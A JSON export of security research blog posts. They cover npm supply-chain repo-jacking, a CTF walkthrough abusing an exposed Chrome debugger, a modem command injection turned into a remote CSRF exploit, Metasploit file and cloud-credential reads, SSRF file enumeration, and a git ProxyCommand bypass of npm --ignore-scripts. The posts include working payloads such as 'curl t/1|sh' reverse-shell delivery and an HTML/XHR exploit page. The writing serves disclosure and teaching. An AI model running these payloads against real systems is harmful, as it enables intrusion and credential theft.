[{
  "section": "Blog",
  "slug": "/blog/attacking-oss-using-abandoned-resources/",
  "title": "Attacking OSS Using Abandoned Resources",
  "description": "A look at how attackers can exploit abandoned resources in the OSS supply chain",
  "date": "January 28, 2021",
  "image": null,
  "imageSM": null,
  "searchKeyword": "",
  "categories": "Security",
  "tags": "security",
  "content":"In December I discovered a supply chain vulnerability that impacted 6,530 public npm package versions, at least I thought I did. Turns out that earlier in October of 2020 Security Innovation published similar research dubbing the issue Repo Jacking. This initially took the wind out of my sails but after I thought about it rediscovery is pretty cool and I was able to expand upon it a bit by focusing on abandoned S3 buckets, Google Cloud Storage bucket, expired domain names, and finding and reporting a vulnerability in GitHub to make exploitation possible in some conditions.\nIf you want to see if your organization is potentially at risk, here is a list of package versions that were found to be vulnerable. If you are using these particular package versions I would recommend not.\nWhile maintainers were notified by email a lot of those emails bounced. Please do not go screaming into the issues, email, or DMs of these package maintainers\u0026hellip; and if you do reach out please be kind and respectful of their volunteer, unpaid, time. I encourage all security practitioners to get more involved in the open source communities they complain about (I too could do a better job here)\u0026hellip; Anyway, on to the details!\nDetails It‚Äôs typical for a Node.js based application to have many 3rd party dependencies. These npm packages can point to resources (the package) that are not hosted by the npm Registry. Typically these types of dependencies will be either a file or git repository that is available via HTTP/HTTPS or SSH.\nIf the dependency reference (domain, storage bucket, GitHub account) becomes abandoned and made available for an attacker to claim then an attacker can now control this resource as part of the npm install process creating an exploitable situation.\nAttack Walk Through Let‚Äôs look at an example of how this might be exploited using a GitHub repository.\nThe attacker registers the available GitHub username and creates a repository with the same name and the code they want to be their payload shaped like an npm package.\nWhen the app owner runs npm install npm will run a git clone on the referenced repository. Let‚Äôs say the dependency reference looks like: github:evilpacket/beep-boop#beta It will clone evilpacket/beep-boop. Once the clone is complete npm will try to git checkout whatever comes after the #, in this case the beta branch or in the case of the lock file it will checkout a particular commit hash.\nWhat are some mitigating circumstances There are some npm features that can change how exploitable this is from situation to situation.\npackage-lock.json\npackage-lock.json can save you in some situations, especially for anything that directly references a file vs a repository (repos are a special). This is because it has the integrity hashes that aren\u0026rsquo;t going to match when the attacker changes the payload.\nAlso a package-lock.json won\u0026rsquo;t help you on initial install or if package-lock.json isn\u0026rsquo;t being used. You should be checking that file into all your projects and using npm ci for builds.\nThe local npm cache\nIf the object that is requested is in the cache, you‚Äôre going to get that object and not a public or attacker controlled object.\ndev Dependencies\nAnother aspect that shapes exploitability here is if the vulnerable dependency is a dev (development) dependency or not. Dev dependencies aren\u0026rsquo;t going to get installed with a typical npm install pkg but could still be useful in a targeted attack against a developer of one of those packages ( but who would want to do that üòà )\nGitHub branch names \u0026amp; policies\nGitHub (and others like gitlab) will block the creation of a branch name that is 40 hex characters (the same format as a commit hash) with an error like remote: error: GH002: Sorry, branch or tag names consisting of 40 hex characters are not allowed., however I found a way around this security control so while I couldn‚Äôt forge a commit hash I could name a branch the same as the upstream commit hash and our payload would pass validation in the package-lock.json.\nThis issue was reported to GitHub security ‚ù§Ô∏è.\nAdditionally GitHub claims ‚ÄúTo prevent developers from pulling down potentially unsafe packages, we now retire the namespace of any open source project that had more than 100 clones in the week leading up to the owner‚Äôs account being renamed or deleted.‚Äù That said I did not encounter any block when testing exploitation of this issue with older versions of the popular webpack-cli package, but it\u0026rsquo;s likely all these packages fall just below the popularity watermark set by this control.\nResults, Numbers, and that\u0026rsquo;s it. While I‚Äôm never shocked to find vulnerable dependencies in the npm Registry I wasn‚Äôt expecting this many packages to be vulnerable.\nYou can find the package list here: https://evilpacket.net/files/vulnerable_package_versions.csv\nSummary breakdown by resource type. As you can see the behavior of using GitHub repositories as dependencies and the forwarding behavior that GitHub allows creates a lot more vulnerability.\nResource PKG Count Google Cloud Storage Buckets abandoned 2 AWS S3 Bucket abandoned 7 Domain Name expired 2 GitHub Repo (not found or redirect) 743 I think the conclusion of this is that you need to scrutinize the open source you use and your supply chain a lot more than you think you do. Enjoy typing npm install.\n"},{
  "section": "Blog",
  "slug": "/blog/headless-holiday-hack-part-1/",
  "title": "Headless Holiday Hack: Flag 1",
  "description": "holiday CTF challenge",
  "date": "November 27, 2020",
  "image": null,
  "imageSM": null,
  "searchKeyword": "",
  "categories": "CTF",
  "tags": "security, ctf",
  "content":"Last night I tossed up a quick CTF-esque challenge with a couple of flags defined.\nThe host and service to attack is located at 178.128.7.71:9222 and will be online until it\u0026rsquo;s rooted or I get tired of watching it. Spoilers ahead.\nDiscovery If you visit this in a browser you\u0026rsquo;ll see \u0026ldquo;Inspectable WebContents\u0026rdquo;, in older versions or maybe this is because it\u0026rsquo;s Chromium vs Chrome idk, you used to see \u0026ldquo;WebSockets requests was expected\u0026rdquo;\nDepending on how you went about discovery you should arrive at the conclusion that it\u0026rsquo;s a remote headless debugger.\nIf you want to run this locally and play around you can do something like the following.\n/Applications/Google\\ Chrome.app/Contents/MacOS/Google\\ Chrome --remote-debugging-port=9222 --remote-debugging-address=127.0.0.1 --headless\nGetting the flag There are a few ways we can interact with this. I prefer to setup the debugger as a remote.\nNavigate to chrome://inspect Click \u0026lsquo;Configure\u0026hellip;\u0026rsquo; Enter in the host:port of the remote debugger - 178.128.7.71:9222 Click \u0026lsquo;Done\u0026rsquo; You should then see something like this. The important piece here is for the first flag is \u0026lsquo;Open tab with url\u0026rsquo; -\nIf we step back and think about what we have in front of us is just a web browser that\u0026rsquo;s running on a remote host. We can tell it to go to any url that we want and it will do that, type evilpacket.net and you\u0026rsquo;re surfing evilpacket.net (lol surfing the web) but there are more than just http and https:// url schemas. The file:// schema will let us read from a local file, remember to keep your perspective as operating from the remote host, so we\u0026rsquo;re reading files that the remote process can read.\nIf you just click on the about:blank url and try and navigate to file:////home/browser/flag.txt it won\u0026rsquo;t work because the : gets stripped. Using window.location='file:////home/browser/flag.txt' Might give an error Not allowed to load local resource:\nBut if we use the \u0026lsquo;Open tab with url\u0026rsquo; box mentioned above you can open a tab to that location and read the contents. Ooh and the contents might not be visible to you in the page on the debugger you might have to dig through the elements.\nA few handy tips http://178.128.7.71:9222/json will show you all the tabs and their debugger endpoints. Sometimes when you find debuggers in the wild this blob will have internal IP addresses, just re-write them.\nIf you don\u0026rsquo;t have the Open tab with url inputbox, you can use http://178.128.7.71:9222/json/new?file:////home/browser/flag.txt to create a tab to be able to inspect.\nInteresting data The first 3 people to bring me the flag were\n@jstash @cnelson @JF0LKINS @substack Here is a list of the urls that various people have tried so far.\nok. I think that should leave everyone on the same page for part 2. Hints to follow on twitter.\n"},{
  "section": "Blog",
  "slug": "/blog/my-favorite-vuln/",
  "title": "My Favorite Vulnerability: From ERROR to inter-protocol exploitation",
  "description": "This is the story about how I found my favorite vuln!",
  "date": "February 9, 2020",
  "image": null,
  "imageSM": null,
  "searchKeyword": "",
  "categories": "Research",
  "tags": "research",
  "content":"I\u0026rsquo;m excited to finally write up and share my favorite vulnerability I\u0026rsquo;ve ever found. It\u0026rsquo;s a story where all the right pieces fell into place to make it exploitable. The names, ports, and other details have been changed to protect the vulnerable even though this took place probably 6 years ago and I believe the devices are now sunsetted.\nSo there I was testing this, ah, device. Let\u0026rsquo;s just go with that for now. This device had an internal network and an external network.\nEnumeration The first step was to figure out what kind of surface area I was working with. I knew it had a web interface but wasn\u0026rsquo;t sure what else I would find. A port scan reviled a service running on port 55555/TCP.\nConnecting to the device on that port just sat there\u0026hellip;.. waiting for me. So I typed asdf[enter] It quickly shot back ERROR. and went back to waiting for input. This tickled the back of my brain. I\u0026rsquo;ve seen this before\u0026hellip;. It felt like I sat there forever trying to solve this mystery and then my brain told my fingers to type AT[enter]. OK the terminal told me. Eureka!, we were on to something. It\u0026rsquo;s a modem. I started an ISP back when I was younger and in the following years spent a lot of time with modems. Time to knock some dust off the old brain.\nFuzzing As I dug up some old command references I put together a simple AT command fuzzer. That didn\u0026rsquo;t yield as much as remembering that AT\u0026amp;V would dump the current modem configuration.\nHunting for vulns I went through each configuration value seeing what vulnerabilities might pop up. I saw one AT\u0026amp;$DNS and thought it would be interesting to control DNS so I could redirect traffic, but it got a lot more interesting.\nI setup a packet capture on port 53 (tcpdump -vvnni eth0 port 53) and issued the following command to point the devices DNS requests to my system. AT$DNS=1,\u0026quot;192.168.1.2\u0026quot;,\u0026quot;192.168.1.3\u0026quot;\nSure enough DNS requests from the device started to flow into my packet capture. I thought If I\u0026rsquo;m able to control system DNS maybe it\u0026rsquo;s possible the values aren\u0026rsquo;t being sanitized and more can be done.\nI tried AT$DNS=1,\u0026quot;192.168.1.2\u0026quot;,\u0026quot;`ping 192.168.1.2`\u0026quot; which failed. But I thought was because spaces were not allowed. I tried AT$DNS=1,\u0026quot;192.168.1.2\u0026quot;,\u0026quot;`ping$IFS\\test`\u0026quot; and sure enough I was seeing the dns request for test but commands longer than 15 characters (the length of an IP address) failed.\nI wanted simple confirmation that it was injectable so I tried AT$DNS=1,\u0026quot;192.168.1.2\u0026quot;,\u0026quot;`reboot`\u0026quot; this turned out to be a bad idea as not only did it reboot the device but this command got written into a startup script that cause it to enter into an endless reboot cycle. Not my finest moment.\nInternal Exploitation So here I was with a command injection on an internal service but I\u0026rsquo;m limited to a 15 character payload.\nMaybe I could curl something|sh but that approach was too long even for the shortest domain I had which was 6 characters in length, but that lead to the answer.\nSince I could control DNS I could use just a single character.\nI spun up the node.js based DNS server below so that anything that was asked of it would return my systems IP and a web server to return a reverse shell payload.\nvar dns = require(\u0026#39;native-dns\u0026#39;); var server = dns.createServer(); server.on(\u0026#39;request\u0026#39;, function (request, response) { response.answer.push(dns.A({ name: request.question[0].name, address: \u0026#39;192.168.1.2\u0026#39;, ttl: 600, })); response.send(); }); server.on(\u0026#39;error\u0026#39;, function (err, buff, req, res) { console.log(err.stack); }); server.serve(53); Then I sent it this payload, which returned me a reverse shell.\nAT$DNS=1,\u0026#34;192.168.1.2\u0026#34;,\u0026#34;`curl t/1|sh`\u0026#34; \u0026hellip;and the best feeling in the world.\n$ whoami root Inter-Protocol Exploitation Getting code execution from inside the network device was great but it was extremely unlikely an attacker would be on the network given the type of device it was. The one nice way of pivoting from outside the network to an inside service is using HTTP and CSRF (Cross-Site Request Forgery).\nBut wait, the service on the device we want to talk to isn\u0026rsquo;t HTTP. It does exhibit a really interesting property though. For lines you send it that aren\u0026rsquo;t valid AT modem commands, it just says ERROR and doesn\u0026rsquo;t disconnect the client. So effectively the service will ignore all the HTTP headers until it gets to the body of our payload.\nSo in the end if a user of this particular device visits a website that the attacker controls they can issue a request like the following and gain root access to the system.\n\u0026lt;html\u0026gt; \u0026lt;script\u0026gt; var xhr = new XMLHttpRequest(); xhr.open(\u0026#34;POST\u0026#34;,\u0026#34;http://192.168.1.1:55555\u0026#34;,true); xhr.timeout = 4000; xhr.ontimeout = function () { console.log(xhr.responseText) } xhr.send(\u0026#39;AT$DNS=1,\u0026#34;192.168.1.2\u0026#34;,\u0026#34;`curl t/1|sh`\u0026#34;\\n\u0026#39;); \u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; This was such a great vulnerability to find and exploit. It had a lot of interesting dynamics to it and pieces that had to fall into place to be remotely exploitable. The constraints of the device and vulnerabilities that had to be worked around is what made it both frustrating but fun and in the end a vuln I will never forget.\n"},{
  "section": "Blog",
  "slug": "/blog/identify-an-omg-cable/",
  "title": "Identify an O.MG Cable",
  "description": "How to identify an O.MG cable in the field",
  "date": "January 6, 2020",
  "image": null,
  "imageSM": null,
  "searchKeyword": "",
  "categories": "Research",
  "tags": "hardware",
  "content":"Today I got my hands on an O.MG cable. It is extremely well manufactured and to most it will be extremely stealthy.\nI thought it would be fun and educational to do a side by side comparison to create a reference for some minor visual differences to be able to detect one in the field. This comparison was done with what I believe to be official Apple cables.\nApple cables have more of a matte finish on the usb connector than the O.MG.\nThe connector pins on the apple connector appear to be thinner (showing more background color) than the O.MG cable.\nO.MG cable looks like it has a little robot face.\nOn the back side the Apple connector has a vertical seam where as the O.MG cable has no seam on the back. The O.MG cable has a vertical seam where as the Apple cable does not. The Apple cable is about 1 inch in length longer than the O.MG "},{
  "section": "Blog",
  "slug": "/blog/using-chrome-debugger-msf-gather-module/",
  "title": "Using Chrome Debugger Metasploit Gather Module",
  "description": "",
  "date": "December 19, 2019",
  "image": null,
  "imageSM": null,
  "searchKeyword": "",
  "categories": "OST",
  "tags": "ost, security, dev",
  "content":"This last week Nick Starke got the chrome debugger metasploit module pushed over the line and merged into master. I figured I\u0026rsquo;d write up a quick intro to the module and how it might be used should you happen to stumble across a chrome debugger laying around the network.\nLocal environment If you want to startup chrome and test this yourself you can run chrome in a similar fashion.\n/Applications/Google\\ Chrome.app/Contents/MacOS/Google\\ Chrome --remote-debugging-port=9222 --remote-debugging-address=127.0.0.1 --headless Start msfconsole and use auxilary/gather/chrome_debugger\n=[ metasploit v5.0.64-dev ] + -- --=[ 1952 exploits - 1092 auxiliary - 335 post ] + -- --=[ 558 payloads - 45 encoders - 10 nops ] + -- --=[ 7 evasion ] msf5 \u0026gt; use auxiliary/gather/chrome_debugger show options tells us what we need to set to make this work. The most important being the RHOST of the chrome debugger we\u0026rsquo;re going to gather from.\nmsf5 auxiliary(gather/chrome_debugger) \u0026gt; show options Module options (auxiliary/gather/chrome_debugger): Name Current Setting Required Description ---- --------------- -------- ----------- FILEPATH no File to fetch from remote machine. RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 9222 yes The target port (TCP) TIMEOUT 10 yes Time to wait for response URL no Url to fetch from remote machine. We have two paths with this module to abuse with a chrome debugger. First we can read both files and directory listings from the local disk. Second we can query a URL from the network perspective of the chrome debugger system giving us the ability to potentially access or attack local resources that we didn\u0026rsquo;t have access to before.\nReading a file / directory listing msf5 auxiliary(gather/chrome_debugger) \u0026gt; set FILEPATH /etc/passwd FILEPATH =\u0026gt; /etc/passwd msf5 auxiliary(gather/chrome_debugger) \u0026gt; run [*] Running module against 192.168.12.1 [*] Attempting Connection to ws://192.168.12.1:9222/devtools/page/76FE2B4D88AE3BA2973C801C7A8D1E78 [*] Opened connection [*] Attempting to load url file:///etc/passwd [*] Received Data [*] Sending request for data [*] Received Data [+] Stored file:///etc/passwd at /root/.msf4/loot/20191219130327_default_192.168.12.1_chrome.debugger._265252.txt [*] Auxiliary module execution completed Abusing proc is useful here too if you aren\u0026rsquo;t use what directory you are in.\nset FILEPATH /proc/self/cwd/\nReading from a remote URL In this case we\u0026rsquo;re going to try and access the AWS metadata url, this could be however any internal service.\nmsf5 auxiliary(gather/chrome_debugger) \u0026gt; set URL http://169.254.169.254/latest/meta-data/iam/security-credentials/ URL =\u0026gt; http://169.254.169.254/latest/meta-data/iam/security-credentials/ msf5 auxiliary(gather/chrome_debugger) \u0026gt; run [*] Running module against 192.168.12.1 [*] Attempting Connection to ws://192.168.12.1:9222/devtools/page/2EE2D41C9D77868E7937831A9534FE05 [*] Opened connection [*] Attempting to load url http://169.254.169.254/latest/meta-data/iam/security-credentials/ [*] Received Data [*] Sending request for data [*] Received Data [+] Stored http://169.254.169.254/latest/meta-data/iam/security-credentials/ at /root/.msf4/loot/20191219130931_default_192.168.12.1_chrome.debugger._548422.txt [*] Auxiliary module execution completed "},{
  "section": "Blog",
  "slug": "/blog/leveraging-javascript-debuggers/",
  "title": "Leveraging Javascript Debuggers for compromise",
  "description": "Making your computer rain sensitive data",
  "date": "September 10, 2019",
  "image": null,
  "imageSM": null,
  "searchKeyword": "",
  "categories": "Research",
  "tags": "JavaScript",
  "content":"Summary I discovered that developers do leave remote JavaScript debuggers and headless browsers laying around on the internet leading to sensitive data exposure and an interesting remote position for an attacker.\nThe rest of the story While learning how to actually use chrome devtools to remotely debug a Node.js application was working on I encountered an error when I tried to visit the debugger service with my web browser.\nWhile the Node.js documentation says \u0026ldquo;exposing the debug port publicly is unsafe\u0026rdquo; and by default it listens on localhost my brain wanted to know the answer to this question; Do people just leave their debuggers hanging around on the internet\nThe answer is yes.\nBecause of the unique string that is output when making a basic HTTP request to the debugger service, we can use a service like shodan or zoomeye to find potential targets. On a penetration test this would be something very interesting to keep an eye out for internally.\nhttps://www.shodan.io/search?query=WebSockets+request+was+expected\nIf you find one of these debuggers laying around not only do you get remote code execution, you also get source code, and secrets stored in the environment or the config. There is a lot of interesting and juicy information just laying around the Internet if you are willing to go look for it.\nLet\u0026rsquo;s try it ourselves Once you have found your target open chrome and browse to chrome://inspect/\nClick on the Configure... button\nPut in the ip/hostname and port for the remote target and click Done. Example evilpacket.net:9229\nYou should notice a new remote target appear in the list providing your the node.js version.\nClick inspect to open up the devtools window and connect to the remote host.\nClick Console in the menu bar at the top.\nNow things get interesting and I\u0026rsquo;m not exactly sure why this happens (if somebody reading this knows please tell me), sometimes you get dropped into an alternative context (VM Context x). You will want to click the dropdown and select the node context. If you don\u0026rsquo;t when you try and run some code you might end up with something like\nUncaught ReferenceError: process is not defined at \u0026lt;anonymous\u0026gt;:1:1 At this point you are free to run and execute code as you wish with whatever permissions the user has at whatever location this host is in the remote network.\nBut wait, there\u0026rsquo;s more. More than just Node.js developers utilize Chrome dev tools. In fact a lot of developers use headless browsers for all kinds of testing.\nAninteresting search to do to find these open resources is Inspectable WebContents.\nWhen you connect to one of these instances you basically get a browser inside a browser so you can access any active cookies or client side sensitive data that may be cached. Additionally you get to have a browser at that servers position in the newtork that may be able to access interesting internal services or metadata urls as pictured below.\n"},{
  "section": "Blog",
  "slug": "/blog/enumerating-files-using-server-side-request-forgery-and-the-request-module/",
  "title": "Enumerating Files Using Server Side Request Forgery and the request Module",
  "description": "A look at how attackers can use SSRF and the request module to enumerate files",
  "date": "December 15, 2017",
  "image": null,
  "imageSM": null,
  "searchKeyword": "",
  "categories": "Security",
  "tags": "security",
  "content":"If you ever find Server Side Request Forgery (SSRF) in a node.js based application and the app is using the request module you can use a special url format to detect the existence of files / directories.\nWhile request does not support the file:// scheme it does supports a special url format to communicate with unix domain sockets and the errors returned from a file existing vs not existing are different.\nThe format looks like this. http://unix:SOCKET:PATH and for our purposes we can ignore PATH all together.\nLet‚Äôs take this code for example. We‚Äôre assuming that as a user we can somehow control the url.\nFile exists condition:\nconst Request = require(\u0026#39;request\u0026#39;) Request.get(\u0026#39;[http://unix:/etc/passwd\u0026#39;](http://unix:/etc/passwd\u0026#39;), (err) =\u0026gt; { console.log(err) }) As /etc/password exists request will try and use it as a unix socket, of course it is not a unix socket so it will give a connection failure error.\n{ Error: connect **ENOTSOCK** /etc/passwd at Object._errnoException (util.js:1024:11) at _exceptionWithHostPort (util.js:1046:20) at PipeConnectWrap.afterConnect [as oncomplete] (net.js:1182:14) code: \u0026#39;ENOTSOCK\u0026#39;, errno: \u0026#39;ENOTSOCK\u0026#39;, syscall: \u0026#39;connect\u0026#39;, address: \u0026#39;/etc/passwd\u0026#39; } File does not exist condition:\nUsing the same code with a different file that does not exist.\nconst Request = require(\u0026#39;request\u0026#39;) Request.get(\u0026#39;[http://unix:/does/not/exist\u0026#39;](http://unix:/etc/passwd\u0026#39;), (err) =\u0026gt; { console.log(err) }) The resulting error looks like this.\n{ Error: connect **ENOENT** /does/not/exist at Object._errnoException (util.js:1024:11) at _exceptionWithHostPort (util.js:1046:20) at PipeConnectWrap.afterConnect [as oncomplete] (net.js:1182:14) code: \u0026#39;ENOENT\u0026#39;, errno: \u0026#39;ENOENT\u0026#39;, syscall: \u0026#39;connect\u0026#39;, address: \u0026#39;/does/not/exist\u0026#39; } The different is small: ENOTSOCK, vs ENOENT\nWhile not that severe of an issue on its own it‚Äôs a trick that‚Äôs help me on past security assessments to enumerate file path locations. Maybe you‚Äôll find it useful too.\nOriginally posted on Medium\n"},{
  "section": "Blog",
  "slug": "/blog/npm-registry-spelunking-dependencies-referenced-by-url/",
  "title": "npm Registry Spelunking: Dependencies Referenced by URL",
  "description": "",
  "date": "November 8, 2017",
  "image": null,
  "imageSM": null,
  "searchKeyword": "",
  "categories": "Research",
  "tags": "security",
  "content":"I‚Äôve learned a long time ago that not all security research pans out with a stack of vulnerabilities but every time I venture down a rabbit hole I learn something along the way. This is one of those times.\nDuring a recent assessment ^Lift team member Jon Lamendola found an access_token on a url for a project dependency and that got us thinking:\n‚Äúwonder if any npm dependencies are using urls that contain tokens or passwords.‚Äù That was enough to nerd snipe an hour of my time as I answered his question and found a few more to answer along the way. Let me take you through the process and we‚Äôll see what results shook out of the npm registry.\nGathering of the urls To get the url‚Äôs the first thing I had todo was get the metadata from the registry. I do this with a script that looks like this.\nwget \u0026#34;https://replicate.npmjs.com/registry/_all_docs?include_docs=true\u0026#34; -O registry.json This will yield you an 8GB JSON file should you want to do your own spelunking. A stream and some for loops later I had a file that contained urls from any dependency that referenced it‚Äôs source as a url. The result was 9,326 unique urls from 7,482 modules. Not as many as I had suspected, but enough to keep going.\nLooking for access_tokens Quick grep for access_token and various other key words (key, token, secret, password) yielded no modules that contained a token similar to what Jon had witnessed. I also looked for any urls that had query string parameters just for coverage sake and also urls that contained HTTP basic auth and the result of interest was again 0. I was surprised at the random places (like dropbox.com) people were referencing to install dependencies from, I had to keep digging around.\nEDIT: Jon Lamendola took a look over the url list after I had published this and found a needle in the haystack. 1 set of basic auth credentials that seem to be invalid at this time.\nInteresting to note that 845 of those url‚Äôs are just using HTTP, not HTTPS. Those modules could potentially be vulnerable to MTIM if the attacker had the right network position (you never npm i at the coffee shop do you?)\nRemoving every github.com, github.io, and npmjs.org url and filtering the list further by hand brought it down to 75 domains and this is where things got interesting.\nA few of those were very much Amazon S3 buckets. I resolved every domain to see if they resolved to an S3 bucket and added them to the list of potential S3 buckets, then I visited each one looking to see which ones were not active anymore. As S3 is a global name space if I found an abandoned bucket still in use I could grab it and fill it with whatever nefarious package material I wanted.\nThis was fun. I found 2 buckets to squat on. üéâ But as I looked further those dependencies were used for a really old version of the modules so while I grabbed the buckets for the sake of science and maybe I could compromise something but the likelihood went down greatly as it wasn‚Äôt a recent version or popular module.\nThe rabbit hole continues‚Ä¶ I thought are any of those domains expired? Same principle as the buckets, I could register the domain if it was to become expired and then take over the resources. Again nothing. üò≠\nMost of these were long shots, but hey I looked and learned a few things along the way.\nBe cautious of packages with urls for dependencies. What‚Äôs interesting to remember here is that these dependency resources are mutable. Maybe the hosting server says for anybody with .gov owned addresses gets one file and everyone gets another one.\nMake sure dependencies you use don‚Äôt have dependencies that reference HTTP only url‚Äôs. Those will be susceptible to tampering the first time you install it. What was fun to learn was that while the HTTP based dependencies won‚Äôt have that integrity check on their first download npm will store the hash inside the package-lock.json file for integrity on future installations. This is one good reason you should be checking in your package-lock.json.\nFinally if you use a S3 bucket for something, just assume you are going to have to keep that bucket around forever. Even if you empty it out keep your hands on it and don‚Äôt let me have it.\nOriginally posted on Medium\n"},{
  "section": "Blog",
  "slug": "/blog/bypassing-npm-ignore-scripts-with-command-injection-in-package-json/",
  "title": "Bypassing npm / yarn ignore Scripts with Command Injection",
  "description": "A look at how attackers can exploit the npm ignore scripts with command injection",
  "date": "August 10, 2017",
  "image": null,
  "imageSM": null,
  "searchKeyword": "",
  "categories": "Security",
  "tags": "security",
  "content":"Before you read this post please run git --version and if it‚Äôs not 2.14.1 or greater then please go upgrade it.\nIn this post we are going to explore abusing the recently published git ssh:// url vulnerability inside of a package.json to execute commands during the npm install process.\nHow the vulnerability works:\nThe git vulnerability results from a malformed ssh:// url beginning with a dash (-), confusing the ssh command into thinking the hostname is a command argument rather than a hostname.\nTake this proof of concept example. It injects the -V argument and exits.\ngit clone ssh://-V/github.com Cloning into ‚Äògithub.com‚Äô‚Ä¶ OpenSSH_7.4p1, LibreSSL 2.5.0 fatal: Could not read from remote repository. Please make sure you have the correct access rights and the repository exists. But nobody cares about the git version for pwnage, that doesn‚Äôt get an attacker very far. This variation abuses the -oProxyCommand configuration option to execute a shell command before the clone happens.\ngit clone ssh://-oProxyCommand=touch%20somefile/github.com Now I mentioned I was going to show how to execute commands during the npm install process. It‚Äôs already well known that npm install scripts (preinstall, install, and postinstall) already allow us to execute arbitrary shell scripts. For security purposes users can opt out of executing shell scripts from executing by adding in the \u0026ndash;ignore-scripts flag.\nSo hopefully you can see where I‚Äôm going with this. Can we execute arbitrary commands during the npm i with the \u0026ndash;ignore-scripts flag present? Yes we can, but it‚Äôs not as straight forward as the above example.\nnpm supports git+ssh:// urls. The first thing I did was to confirm that it did in fact utilize the underlying system git, as I wasn‚Äôt sure if npm ran its own pre-packaged git or a version written in node.js.\nI did this by mocking up a simple module and putting in a broken git+ssh:// url hoping it would give me details during the error. It did.\nPackage.json\n{ \u0026#34;name\u0026#34;: \u0026#34;git\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;index.js\u0026#34;, \u0026#34;scripts\u0026#34;: { \u0026#34;test\u0026#34;: \u0026#34;echo \\\u0026#34;Error: no test specified\\\u0026#34; \u0026amp;\u0026amp; exit 1\u0026#34; }, \u0026#34;keywords\u0026#34;: [], \u0026#34;author\u0026#34;: \u0026#34;Adam Baldwin \u0026lt;baldwin@andyet.net\u0026gt;\u0026#34;, \u0026#34;license\u0026#34;: \u0026#34;ISC\u0026#34;, \u0026#34;dependencies\u0026#34;: { \u0026#34;hax\u0026#34;: \u0026#34;git+ssh://\u0026#34; } } Error Results\nnpm ERR! Error while executing: npm ERR! /usr/bin/git ls-remote -h -t ssh:// From there it got a little frustrating. It‚Äôs not just a simple git clone that is executed during the npm install process so our url has to satisfy multiple commands.\nThe first thing I tried was the standard payload. Just touching a file to see if I could get it to run and get multiple arguments. For brevity I‚Äôll just include the url and the error it gave.\n\u0026#34;hax\u0026#34;: \u0026#34;git+ssh://-oProxyCommand=touch%20blah/github.com\u0026#34; npm ERR! Error while executing: npm ERR! /usr/bin/git ls-remote -h -t ssh://-oproxycommand/=touch%20blah/github.com npm ERR! npm ERR! command-line line 0: Missing argument. This is where the @ comes in to give us our missing argument.\n\u0026#34;hax\u0026#34;: \u0026#34;git+ssh://-oProxyCommand=touch%20blah@github.com\u0026#34; npm ERR! Error while executing: npm ERR! /usr/bin/git ls-remote -h -t ssh://-oProxyCommand%3Dtouch%20blah%20@github.com npm ERR! npm ERR! fatal: No path specified. See ‚Äòman git-pull‚Äô for valid url syntax But it‚Äôs still not happy. It wants a path. ¬Ø\\(„ÉÑ)/¬Ø\nnpm ERR! Error while executing: npm ERR! /usr/bin/git ls-remote -h -t ssh://-oProxyCommand%3Dtouch%20blah%20@github.com npm ERR! npm ERR! fatal: No path specified. See ‚Äòman git-pull‚Äô for valid url syntax Here is the final working proof of concept. This executes touch blah @github when npm i \u0026ndash;ignore-scripts is run.\n{ \u0026#34;name\u0026#34;: \u0026#34;git\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;index.js\u0026#34;, \u0026#34;scripts\u0026#34;: { \u0026#34;test\u0026#34;: \u0026#34;echo \\\u0026#34;Error: no test specified\\\u0026#34; \u0026amp;\u0026amp; exit 1\u0026#34; }, \u0026#34;keywords\u0026#34;: [], \u0026#34;author\u0026#34;: \u0026#34;Adam Baldwin \u0026lt;baldwin@andyet.net\u0026gt;\u0026#34;, \u0026#34;license\u0026#34;: \u0026#34;ISC\u0026#34;, \u0026#34;dependencies\u0026#34;: { \u0026#34;hax\u0026#34;: \u0026#34;git+ssh://-oProxyCommand=touch%20blah%20@github.com/\u0026#34; } } Yarn! This isn‚Äôt an npm problem. This also works in yarn, but the proof of concept looks a little different.\n\u0026#34;dependencies\u0026#34;: { \u0026#34;hax\u0026#34;: \u0026#34;git+ssh://-oProxyCommand=touch%20mega_secure/\u0026#34; } Monitoring for abuse ‚Ä¶ and just to be sure, I did check all the git+ssh:// dependencies referenced in the npm registry and didn‚Äôt find any malicious urls. We‚Äôre also continuing to monitor in real time for these urls being published to the registry.\nOriginally posted on Medium\n"},{
  "section": "Blog",
  "slug": "/blog/my-story-about-mentorship/",
  "title": "My story about mentorship and my career",
  "description": "My story about mentorship and my career",
  "date": "June 20, 2017",
  "image": null,
  "imageSM": null,
  "searchKeyword": "",
  "categories": "Career",
  "tags": "career",
  "content":"The Practical Developer DevDiscuss one day got me thinking about mentorship and how it‚Äôs impacted my life. It doesn‚Äôt fit in a tweet or a thread of tweets so you get the story about how a mentorship gave me my entire career in security. This is going to be a bit stream of mind so give me a break on grammar and spelling :)\nI was raised in a small farming town in Minnesota. There wasn‚Äôt a lot to do and naturally children would grow up to inherit the farm. When I was 8 I got a computer, learned basic by changing lines in gorilla.bas. When I was 15 the town got a 2 line BBS. My dad got us an account for a small fee and the mischief began.\nI mostly played LORD (Legend Of the Red Dragon) but there was content that wasn‚Äôt accessible to me at 15 that I wanted access to. So my curiosity got the better of me and password guessing I went. I managed to gain access to the sysops account and I still remember the password 070257. Then I broke the first rule of any hack, don‚Äôt talk about it, promptly bragged to my friends and in a town of 1300 people, word got to the sysop pretty quick.\nInstead of being in trouble I got a discussion about ethics. Instead of having my account banned I got promoted to co-sysop. This was not like what I had experienced any other time in my life. I did something bad or mischievous and I got punished. I was being rewarded here for being curious and what I didn‚Äôt realize was I gained a mentor.\nSoon co-sysop turned into a job and after school I built computers, replaced sound cards and set IRQs. I learned a lot of things at this job and Jim my mentor was patient with me teaching me so that next time he wouldn‚Äôt have to show me again.\nI learned a lot of skills from sales and customer service to technical troubleshooting skills. All core to what I do today.\nHe taught me visual basic and introduced me to c and assembly. But he also let me explore my mischievous side. He introduced me to +ORC / Fravia and reversing. That included how to use softice debugger (I still remember removing the neopaint nag screen and how excited I was that it worked and didn‚Äôt crash).\nI learned about integrity the hard way after I took a job moonlighting 